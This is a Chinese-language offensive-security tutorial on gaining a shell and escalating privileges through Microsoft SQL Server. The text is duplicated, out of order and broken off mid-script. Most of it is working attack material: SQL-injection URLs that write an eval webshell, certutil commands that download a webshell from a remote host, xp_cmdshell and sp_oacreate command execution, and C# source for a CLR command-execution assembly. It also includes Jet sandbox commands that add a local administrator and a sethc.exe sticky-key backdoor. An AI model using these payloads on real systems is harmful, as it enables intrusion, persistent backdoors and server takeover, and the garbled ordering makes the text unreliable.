输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）\npwershell -exec bypass ./dll.ps1\r 打开可看到提权SQL语句，分别运行每一条SQL语句\n进入msdb数据库\nuse msdb;\r 0x03 将存储.Net程序集的数据库配置为可信赖的。 alter database master set trustworthy on;\r 0x04 启用MSSQL CLR功能 exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\r命令解释：\rexec sp_configure 'show advanced options',1; #显示高级选项：\rreconfigure; #重新配置\rexec sp_configure 'clr enabled',1; # 开启clr enabled 选项\rreconfigure; #重新配置\r--关闭所有服务器配置选项\rEXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE\r--如果存在权限问题，执行下面一段脚本\ralter database [master] set TRUSTWORTHY on\rEXEC sp_changedbowner 'sa'\r 0x05 利用SQL语句导入程序集 CREATE ASSEMBLY [Database1]\rAUTHORIZATION [dbo]\rFROM 0x0000\rWITH PERMISSION_SET = UNSAFE;\rGO\r 0x06 创建存储过程 CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\r 0x07 执行命令 执行系统命令，查看当前的权限\nexec dbo.ExecCommand 'whoami';\r 沙盒提权 什么是沙盒？\n沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。\n利用前提：\n 1.需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂\n2.dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备\n 提权操作\n简单总结\n--提权语句\rexec sp_configure 'show advanced options',1;reconfigure;\r-- 不开启的话在执行xp_regwrite会提示让我们开启，\rexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;\r--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。\rexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;\r--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。\rexec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'\r--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net user margin margin /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net localgroup administrators margin /add\u0026quot;)')\r沙盒模式SandBoxMode参数含义（默认是2）\r`0`：在任何所有者中禁止启用安全模式\r`1` ：为仅在允许范围内\r`2` ：必须在access模式下\r`3`：完全开启\ropenrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。\r--恢复配置\r--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;\r--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;\r--exec sp_configure 'show advanced options',0;reconfigure;\r 引用前辈们的话\n 1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令\n 利用镜像劫持提权 0x01 简介 通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。\n前提条件：\n 1.未禁止注册表编辑（即写入功能）\n2.xp_regwrite启用\n 0x02 映像劫持提权 1.查看xp_regwrite是否启用 select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'\r 返回1表示xp_regwrite组件启用 返回0则表示未启用\n2.xp_regwrite开启与关闭 EXEC sp_configure 'show advanced options', 1\rRECONFIGURE\rEXEC sp_configure 'xp_regwrite',1\rRECONFIGURE\r 3.利用regwrite函数修改组注册表进行劫持 首先我们利用regwrite函数修改组册表进行劫持，这里如果regwrite执行失败参考上面的开启方法。\nEXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\\windows\\system32\\cmd.exe'\r 4.查看是否劫持成功 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger'\r 5.验证是否成功 紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口\n拓展：\n上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作\n6.删除指定注册表键值 删除粘滞键的键值\nxp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\r 利用Agent Job执行命令 0x01 简介 SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。\n原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。\nJob执行命令 1.启动sqlagent服务 首先需要启动sqlagent服务：\nexec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'\r 2.进入数据库 USE msdb;  3.定义创建作业 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1';  4.定义作业步骤 定义作业步骤(作业中查看当前用户并将用户写入c:\\1.txt文件中)\nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami \u0026gt;c:\\\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';  5.启动作业 启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。\nEXEC dbo.sp_start_job N'test_powershell_job1';\r 6.验证是否成功 参考地址：\nhttps://www.freebuf.com/vuls/276814.html\rhttps://y4er.com/post/mssql-getshell/\rhttps://f5.pm/go-26046.html\rhttp://alexsel.com/index.php/archives/80/\rhttps://xz.aliyun.com/t/9475\r ","id":49,"section":"posts","summary":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整","tags":["MSSQL","内网渗透"],"title":"MSSQL获取shell和提权","uri":"https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境。 端口号：1433\nSA用户 在搭建时，选择使用SQL Server身份验证会创建SA账户并设置密码，SA(System Administrator)表示系统管理员，在SQLServer2019之前的SA用户都是系统最高权限用户SYSTEM，但在2019版本时为普通数据库用户mssqlserver，是一个低权用户。\n系统库 系统数据库默认创建时就会存在，有以下4种\n存储过程 存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。\n系统存储过程、扩展存储过程、用户自定义的存储过程。\n 系统存储过程主要存储在master数据库中，以\u0026quot;sp_\u0026ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名； 扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_\u0026ldquo;为前缀，使用方法与系统存储过程类似； 用户定义的存储过程是SQLServer的使用者编写的存储过程；  存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。\nServer权限体系 权限两个字，一个权力，一个限制。在软件领域通俗的解释就是哪些人可以对哪些资源做哪些操作。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：\n主体 “主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:\n Windows级别主体：包括Windows 域登录名和Windows 本地登录名。 服务器级别主体：包括服务器登录名和服务器角色。 数据库级别主体：包括数据库用户、数据库角色、固定数据库角色以及应用程序角色。  可以看到主体包括登录名以及角色。\n角色 角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。 角色在SQL Server中被分为三类，分别为:\n 内置角色\u0026mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除 用户自定义角色\u0026mdash;-这类角色由用户按照需求自定义创建 应用程序角色\u0026mdash;-这类特殊角色用于管理应用程序的数据访问  角色也分为两个方面：\n 服务器级别的角色，用于数据库服务器方面的控制权限 数据库级别的角色，用于数据库中数据的控制权限。  1.服务器级别的角色 服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。 **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：\n   服务器角色 含义     sysadmin 可以在服务器上执行任何活动   serveradmin 可以更改服务器范围的配置选项和关闭服务器   securityadmin 管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码   processadmin 管理SQL Server运行的进程   setupadmin 可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）   bulkadmin 可以运行 BULK INSERT 语句   diskadmin 用于管理磁盘文件   dbcreator 可以创建、更改、删除和还原任何数据库   public public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    2.数据库级别的角色 数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。 SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。 * 数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：\n   数据库角色 含义     db_owner 可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动   db_securityadmin 管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级   db_accessadmin 可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限   db_backupoperator 可以备份数据库   db_ddladmin 可以在数据库中运行任何数据定义语言 (DDL) 命令   db_datawriter 可以在所有用户表中添加、删除或更改数据   db_datareader 可以从所有用户表中读取所有数据   db_denydatawriter 不能添加、修改或删除数据库内用户表中的任何数据   db_denydatareader 不能读取数据库内用户表中的任何数据   public public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    登录账号和数据库用户 SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。 服务器登陆账号分为为Windows验证及SQL Server验证两种。\n Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。 SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。  getshell 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。\n拿shell的两大前提就是\n 有相应的权限db_owner 知道web目录的绝对路径  我们先来了解下怎么去寻找web目录的绝对路径。\n寻找绝对路径  报错信息 字典猜 旁站的目录 存储过程来搜索 读配置文件  前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n先来看xp_dirtree直接举例子\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录\rexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\r 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可\nCREATE TABLE tmp (dir varchar(8000),num int,num1 int);\rinsert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\\Users\\Administrator\\Desktop',1,1;\r 测试完成后记得删除tmp表\ndrop table tmp\r 我们再来看xp_cmdshell怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）\nhttp://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));\rhttp://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\r xp_cmdshell拿shell xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径\nhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%^\u0026gt;^\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%^\u0026gt; \u0026gt; c:\\\\WWW\\\\404.aspx' ;\r 由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载\n远程下载文件\rcertutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;\r命令：\rhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;' ;\r#加密\rcertutil -encode test.aspx out.txt\r解密\rcertutil -decode c:\\windows\\Temp\\out.txt c:\\wwwroot\\asp\\aspx.aspx\r1.首先在本地使用certutil加密，将加密后的内容复制出来\recho PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== \u0026gt; C:\\tmp\\shell.txt\r2.解密\rcertutil -f -decode \u0026quot;C:\\tmp\\shell.txt\u0026quot; \u0026quot;C:\\tmp\\shell.jsp\u0026quot;\r使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：\rcertutil -urlcache *\r执行删除缓存\rcertutil -urlcache * delete\r 差异备份拿shell backup database 库名 to disk = 'c:\\bak.bak';--\rcreate table [dbo].[test] ([cmd] [image]);\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\r log备份拿shell LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\nalter database 库名 set RECOVERY FULL create table cmd (a image) backup log 库名 to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r log备份的好处就是备份出来的webshell的文件大小非常的小\n提权 xpcmdshell提权  xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除\n 0x01 xp_cmdshell简介 xp``_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp``_cmdshell来进行提权\n影响范围：\n只要该数据库存在该组件，就可以利用\n0x02 xp_cmdshell使用 1. 查看xp_cmdshell状态 判断xpcmdshell权限\ndeclare @RunningOnACluster char(1)\rdeclare @xp_cmdshell_available char(1)\rdeclare @result int set @xp_cmdshell_available='Y' set @result=0\rselect @RunningOnACluster=case when convert(int, serverproperty('IsClustered')) = 1 then 'Y'\relse 'N' end if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))\rset @xp_cmdshell_available='N' if @RunningOnACluster='Y' begin\rif @xp_cmdshell_available='Y'\rselect @result=1\rif @xp_cmdshell_available='N'\rselect @result=2\rend\rselect @result\r 返回1表示xp_cmdshell组件启用，返回0则表示未启用。\n恢复xp_cmdshell存储过程\n解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。\r第一步先删除：\rdrop procedure sp_addextendedproc\rdrop procedure sp_oacreate\rexec sp_dropextendedproc 'xp_cmdshell'\r第二步恢复：\rdbcc addextendedproc(\u0026quot;sp_oacreate\u0026quot;,\u0026quot;odsole70.dll\u0026quot;)\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot; \u0026quot;)\r直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot;xplog70.dll\u0026quot;)\r代码判断一系列存储过程是否存在，若不存在则恢复。\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))\rdbcc addextendedproc ('xp_cmdshell','xplog70.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))\rdbcc addextendedproc ('xp_dirtree','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))\rdbcc addextendedproc ('xp_fixeddrives','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))\rdbcc addextendedproc ('xp_regread','xpstar.dll')\r 2.开启xp_cmdshell存储过程 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;\r 3.xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令\nexec master.dbo.xp_cmdshell 'whoami'\rexec master.dbo.xp_cmdshell \u0026quot;whoami\u0026quot;\rexec xp_cmdshell \u0026quot;whoami\u0026quot;;\r 4.关闭xp_cmdshell存储过程 关闭xp_cmdshell配置\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\r 删除xp_cmdshell的语句:\nexec sp_dropextendedproc 'xp_cmdshell';\r 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。\ndrop procedure xp_cmdshell;\rexec sp_addextendedproc \u0026quot;xp_cmdshell\u0026quot;, \u0026quot;xplog70.dll\u0026quot;;\r 附录\nexec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\rexec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\rexec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'\r 简单总结：\nxp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。\r启用：\rEXEC sp_configure 'show advanced options', 1\rRECONFIGURE;\rEXEC sp_configure 'xp_cmdshell', 1;\rRECONFIGURE;\r关闭：\rexec sp_configure 'show advanced options', 1;\rreconfigure;\rexec sp_configure 'xp_cmdshell', 0;\rreconfigure;\r删除：\rexec sp_dropextendedproc 'xp_cmdshell';\r执行：\rEXEC master.dbo.xp_cmdshell '命令'\r如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复\rexec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'\r SP_OACREATE 0x01 sp_oacreate简介  调用wscript.shel执行命令\n sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。\n系统管理员使用sp_configure启用sp_oacreate和sp_oamethod系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）\n在效果方面，sp_oacreate、sp_oamethod两个过程和xp_cmdshell过程功能类似，因此可以替换使用！\n利用条件：\n 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）\n2.sqlserver允许远程连接\n3.OLE Automation Procedures选项开启\n 0x02 sp_oacreate使用 1.查看SP_OACREATE状态 我们可以在master.dbo.sysobjects中查看SP_OACREATE状态\nselect * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 2.判断SP_OACREATE是否存在 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 利用count(*)判断是否存在，存在即返回1。\n3.启用SP_OACREATE 利用sp_configure存储过程，启用SP_OACREATE\nexec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;\r 4.利用SP_OACREATE执行命令 利用SP_OACREATE执行系统命令\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r 此利用方法无回显\n5.关闭组件命令 exec sp_configure 'show advanced options',1;\rreconfigure;\rexec sp_configure 'Ole Automation Procedures',0;\rreconfigure;\r 简单总结\n判断SP_OACREATE是否存在\rselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r启用：\rEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 关闭：\rEXEC sp_configure 'show advanced options', 1;\rRECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; 执行：\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。\r CLR提权 0x01 CLR简介 CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。\n更多概念详见下方官方链接：\nhttps://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15\n0x02 编写CLR 利用VS创建MSSQL数据库项目\n修改目标平台和勾选创建脚本\n在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：\nCREATE ASSEMBLY SQLCLRTest FROM 'C:\\MyDBApp\\SQLCLRTest.dll' WITH PERMISSION_SET = SAFE;\r 其权限集有三个选项：\nSAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。\nEXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。\nUNSAFE：允许使用任何代码。\n微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration\n根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。\n创建SQL CLR C# 存储过程\n写入代码\nusing System;\rusing System.Data;\rusing System.Data.SqlClient;\rusing System.Data.SqlTypes;\rusing System.Diagnostics;\rusing System.Text;\rusing Microsoft.SqlServer.Server;\rpublic partial class StoredProcedures\r{\r[Microsoft.SqlServer.Server.SqlProcedure]\rpublic static void ExecCommand (string cmd)\r{\r// 在此处放置代码\rSqlContext.Pipe.Send(\u0026quot;Command is running, please wait.\u0026quot;);\rSqlContext.Pipe.Send(RunCommand(\u0026quot;cmd.exe\u0026quot;, \u0026quot; /c \u0026quot; + cmd));\r}\rpublic static string RunCommand(string filename,string arguments)\r{\rvar process = new Process();\rprocess.StartInfo.FileName = filename;\rif (!string.IsNullOrEmpty(arguments))\r{\rprocess.StartInfo.Arguments = arguments;\r}\rprocess.StartInfo.CreateNoWindow = true;\rprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\rprocess.StartInfo.UseShellExecute = false;\rprocess.StartInfo.RedirectStandardError = true;\rprocess.StartInfo.RedirectStandardOutput = true;\rvar stdOutput = new StringBuilder();\rprocess.OutputDataReceived += (sender, args) =\u0026gt; stdOutput.AppendLine(args.Data);\rstring stdError = null;\rtry\r{\rprocess.Start();\rprocess.BeginOutputReadLine();\rstdError = process.StandardError.ReadToEnd();\rprocess.WaitForExit();\r}\rcatch (Exception e)\r{\rSqlContext.Pipe.Send(e.Message);\r}\rif (process.ExitCode == 0)\r{\rSqlContext.Pipe.Send(stdOutput.ToString());\r}\relse\r{\rvar message = new StringBuilder();\rif (!string.IsNullOrEmpty(stdError))\r{\rmessage.AppendLine(stdError);\r}\rif (stdOutput.Length != 0)\r{\rmessage.AppendLine(\u0026quot;Std output:\u0026quot;);\rmessage.AppendLine(stdOutput.ToString());\r}\rSqlContext.Pipe.Send(filename + arguments + \u0026quot; finished with exit code = \u0026quot; + process.ExitCode + \u0026quot;: \u0026quot; + message);\r}\rreturn stdOutput.ToString();\r}\r}\r 编译成功后\n将以下文件保存为dll.ps1(需要修改dll路径)\n$assemblyFile = \u0026quot;C:\\Users\\Administrator\\Desktop\\dll\\sysinfo.dll\u0026quot;\r$stringBuilder = New-Object -Type System.Text.StringBuilder\r$stringBuilder.AppendLine(\u0026quot;use msdb;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;alter database master set trustworthy on;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\u0026quot;) | Out-Null\r$stringBuilder.Append(\u0026quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x\u0026quot;) | Out-Null\r$fileStream = [IO.File]::OpenRead($assemblyFile) while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(\u0026quot;X2\u0026quot;)) | Out-Null 